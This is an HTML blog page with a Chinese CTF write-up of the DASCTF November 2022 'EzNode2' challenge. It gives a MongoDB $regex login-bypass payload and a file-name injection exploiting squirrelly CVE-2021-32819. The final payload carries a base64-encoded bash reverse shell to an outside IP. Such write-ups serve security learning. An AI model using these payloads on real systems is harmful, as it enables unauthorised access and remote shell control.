@@ -1,0 +1,241 @@
+<!DOCTYPE html><html lang="zh-CH" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>DASCTF2022NOV月赛 | Pale</title><meta name="keywords" content="wp"><meta name="author" content="One"><meta name="copyright" content="One"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="EzNode2给了源码   首先是通过MongoDB注入绕过登录，过滤如下：  1function filter(str) &amp;#123;    return &#x2F;gt|lt|lte|gte|eq|ne|where&#x2F;.test(str)&amp;#125;  没有过滤 $regex ，然后根据html源码可知用户名为admin，所以payload为： 1&amp;#123;&quot;username&quot;:&amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DASCTF2022NOV月赛">
+<meta property="og:url" content="http://example.com/2022/11/30/DASCTF2022NOV%E6%9C%88%E8%B5%9B/index.html">
+<meta property="og:site_name" content="Pale">
+<meta property="og:description" content="EzNode2给了源码   首先是通过MongoDB注入绕过登录，过滤如下：  1function filter(str) &amp;#123;    return &#x2F;gt|lt|lte|gte|eq|ne|where&#x2F;.test(str)&amp;#125;  没有过滤 $regex ，然后根据html源码可知用户名为admin，所以payload为： 1&amp;#123;&quot;username&quot;:&amp;">
+<meta property="og:locale" content="zh_CH">
+<meta property="og:image" content="http://example.com/imgg/10.jpeg">
+<meta property="article:published_time" content="2022-11-30T12:58:56.000Z">
+<meta property="article:modified_time" content="2022-11-30T12:59:50.123Z">
+<meta property="article:author" content="One">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/imgg/10.jpeg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2022/11/30/DASCTF2022NOV%E6%9C%88%E8%B5%9B/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'DASCTF2022NOV月赛',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: true,
+  isToc: true,
+  postUpdate: '2022-11-30 20:59:50'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/sup.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Pale" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/head.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">18</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">8</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/list/"><i class="fa-fw fas fa-list"></i><span> List</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/imgg/10.jpeg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Pale</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/list/"><i class="fa-fw fas fa-list"></i><span> List</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">DASCTF2022NOV月赛</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2022-11-30T12:58:56.000Z" title="Created 2022-11-30 20:58:56">2022-11-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-11-30T12:59:50.123Z" title="Updated 2022-11-30 20:59:50">2022-11-30</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="DASCTF2022NOV月赛"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="EzNode2"><a href="#EzNode2" class="headerlink" title="EzNode2"></a>EzNode2</h1><p>给了源码  </p>
+<p>首先是通过MongoDB注入绕过登录，过滤如下：</p>
+<p><img src="image-20221129191909274.png" alt="image-20221129191909274"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function filter(str) &#123;    return /gt|lt|lte|gte|eq|ne|where/.test(str)&#125;</span><br></pre></td></tr></table></figure>
+
+<p>没有过滤 $regex ，然后根据html源码可知用户名为admin，所以payload为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&#123;&quot;$regex&quot;:&quot;^admi&quot;&#125;,&quot;password&quot;: &#123;&quot;$regex&quot;:&quot;.*&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20221129191809781.png" alt="image-20221129191809781"></p>
+<p>绕过 登陆了</p>
+<p>跟他redit</p>
+<p><img src="image-20221129192019839.png" alt="image-20221129192019839"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[$regex]=^admi&amp;password[$regex]=.*</span><br></pre></td></tr></table></figure>
+
+<p>其实源码 也看出来upload 了</p>
+<p><img src="image-20221129192420514.png" alt="image-20221129192420514"></p>
+<p><img src="image-20221129192457342.png" alt="image-20221129192457342"></p>
+<p>  发现  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data.output = &#x27;&#123;&quot;id&quot;:&quot;3&quot;, &quot;filename&quot;:&quot;&#x27; + req.files.file.name + &#x27;&quot;, &quot;filesize&quot;:&quot;&#x27; + req.files.file.size + &#x27;&quot;, &quot;mimetype&quot;:&quot;&#x27; + req.files.file.mimetype + &#x27;&quot;, &quot;filehash&quot;:&quot;&#x27; + req.files.file.md5 + &#x27;&quot;&#125;&#x27;</span><br><span class="line">        		res.render(&#x27;home.squirrelly&#x27;, JSON.parse(data.output));</span><br></pre></td></tr></table></figure>
+
+<p>这会把文件名 加进去解析了 </p>
+<p>这里拼接json字符串再用 JSON.parse 解析显得很多此一举，并且其中的 name 和 mimetype 都是可以控制的，显然存在属性注入。</p>
+<p>再查看使用的引擎为 squirrelly 搜索可知该引擎存在渲染漏洞 CVE-2021-32819 ，该漏洞简单的说就是渲染时给一个 defaultFilter 属性，该属性会注入到代码中执行也就造成了RCE。那么思路就是在json拼接时注入一个 defaultFilter 即可。</p>
+<p>最终payload就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">QQ.jpg\&quot;,\&quot;autoEscape\&quot;:false,\&quot;defaultFilter\&quot;:\&quot;e&#x27;);require = global.require || global.process.mainModule.constructor._load; require(&#x27;child_process&#x27;).exec(&#x27;echo  L2J....Q==（base64的一句话shell）|base64 -d|bash&#x27;);c.l(&#x27;F&#x27;,&#x27;e</span><br><span class="line"></span><br><span class="line">&quot;QQ.jpg\&quot;,\&quot;autoEscape\&quot;:false,\&quot;defaultFilter\&quot;:\&quot;e&#x27;);require = global.require || global.process.mainModule.constructor._load; require(&#x27;child_process&#x27;).exec(&#x27;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjMuMjQ5LjIyLjM2Lzk5OTkgIDA+JjE=|base64 -d|bash&#x27;);c.l(&#x27;F&#x27;,&#x27;e&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>吸取教训       <img src="image-20221129213059524.png" alt="image-20221129213059524"></p>
+<p>一直打过去500  回头发现在线工具 base和工具base结果不同   </p>
+<p><img src="image-20221129213256327.png" alt="image-20221129213256327"></p>
+<p>弹了shell都解决了</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">One</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2022/11/30/DASCTF2022NOV%E6%9C%88%E8%B5%9B/">http://example.com/2022/11/30/DASCTF2022NOV%E6%9C%88%E8%B5%9B/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/wp/">wp</a></div><div class="post_share"><div class="social-share" data-image="/imgg/10.jpeg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> Donate</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/11/28/%E5%AE%89%E6%B4%B5%E6%9D%AF2022/"><img class="next-cover" src="/imgg/3.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">安洵杯2022</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2022/11/26/GeekChallenge2022/" title="GeekChallenge2022"><img class="cover" src="/imgg/2.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-26</div><div class="title">GeekChallenge2022</div></div></a></div><div><a href="/2021/09/18/cfs%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E6%8C%A8%E6%89%93%E8%AE%B0%E5%BD%95/" title="cfs三层靶机挨打记录"><img class="cover" src="/imgg/2.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-09-18</div><div class="title">cfs三层靶机挨打记录</div></div></a></div><div><a href="/2021/08/25/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%83%E4%B9%A0/" title="php反序列化练习"><img class="cover" src="/imgg/5.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-08-25</div><div class="title">php反序列化练习</div></div></a></div><div><a href="/2022/11/28/%E5%AE%89%E6%B4%B5%E6%9D%AF2022/" title="安洵杯2022"><img class="cover" src="/imgg/3.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-28</div><div class="title">安洵杯2022</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">One</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">18</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">8</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/paleonec" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">博客重构中。。。。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#EzNode2"><span class="toc-number">1.</span> <span class="toc-text">EzNode2</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/11/30/DASCTF2022NOV%E6%9C%88%E8%B5%9B/" title="DASCTF2022NOV月赛"><img src="/imgg/10.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DASCTF2022NOV月赛"/></a><div class="content"><a class="title" href="/2022/11/30/DASCTF2022NOV%E6%9C%88%E8%B5%9B/" title="DASCTF2022NOV月赛">DASCTF2022NOV月赛</a><time datetime="2022-11-30T12:58:56.000Z" title="Created 2022-11-30 20:58:56">2022-11-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/28/%E5%AE%89%E6%B4%B5%E6%9D%AF2022/" title="安洵杯2022"><img src="/imgg/3.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="安洵杯2022"/></a><div class="content"><a class="title" href="/2022/11/28/%E5%AE%89%E6%B4%B5%E6%9D%AF2022/" title="安洵杯2022">安洵杯2022</a><time datetime="2022-11-28T08:59:18.000Z" title="Created 2022-11-28 16:59:18">2022-11-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/26/GeekChallenge2022/" title="GeekChallenge2022"><img src="/imgg/2.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="GeekChallenge2022"/></a><div class="content"><a class="title" href="/2022/11/26/GeekChallenge2022/" title="GeekChallenge2022">GeekChallenge2022</a><time datetime="2022-11-26T12:22:29.000Z" title="Created 2022-11-26 20:22:29">2022-11-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/01/06/Mysqludf%E6%8F%90%E6%9D%83/" title="Mysqludf提权"><img src="/imgg/10.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Mysqludf提权"/></a><div class="content"><a class="title" href="/2022/01/06/Mysqludf%E6%8F%90%E6%9D%83/" title="Mysqludf提权">Mysqludf提权</a><time datetime="2022-01-06T06:36:42.000Z" title="Created 2022-01-06 14:36:42">2022-01-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/01/06/mysql%E6%B3%A8%E5%85%A5%E4%B8%80%E4%BA%9B%E7%82%B9%E7%9A%84%E6%80%BB%E7%BB%93/" title="mysql注入一些点的总结"><img src="/imgg/10.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="mysql注入一些点的总结"/></a><div class="content"><a class="title" href="/2022/01/06/mysql%E6%B3%A8%E5%85%A5%E4%B8%80%E4%BA%9B%E7%82%B9%E7%9A%84%E6%80%BB%E7%BB%93/" title="mysql注入一些点的总结">mysql注入一些点的总结</a><time datetime="2022-01-06T02:06:53.000Z" title="Created 2022-01-06 10:06:53">2022-01-06</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By One</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="Toggle Between Traditional Chinese And Simplified Chinese">繁</button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>if (!window.MathJax) {
+  window.MathJax = {
+    tex: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]],
+      tags: 'ams'
+    },
+    chtml: {
+      scale: 1.2
+    },
+    options: {
+      renderActions: {
+        findScript: [10, doc => {
+          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+            const display = !!node.type.match(/; *mode=display/)
+            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+            const text = document.createTextNode('')
+            node.parentNode.replaceChild(text, node)
+            math.start = {node: text, delim: '', n: 0}
+            math.end = {node: text, delim: '', n: 0}
+            doc.math.push(math)
+          }
+        }, ''],
+        insertScript: [200, () => {
+          document.querySelectorAll('mjx-container:not\([display]\)').forEach(node => {
+            const target = node.parentNode
+            if (target.nodeName.toLowerCase() === 'li') {
+              target.parentNode.classList.add('has-jax')
+            } else {
+              target.classList.add('has-jax')
+            }
+          });
+        }, '', false]
+      }
+    }
+  }
+  
+  const script = document.createElement('script')
+  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
+  script.id = 'MathJax-script'
+  script.async = true
+  document.head.appendChild(script)
+} else {
+  MathJax.startup.document.state(0)
+  MathJax.texReset()
+  MathJax.typeset()
+}</script></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
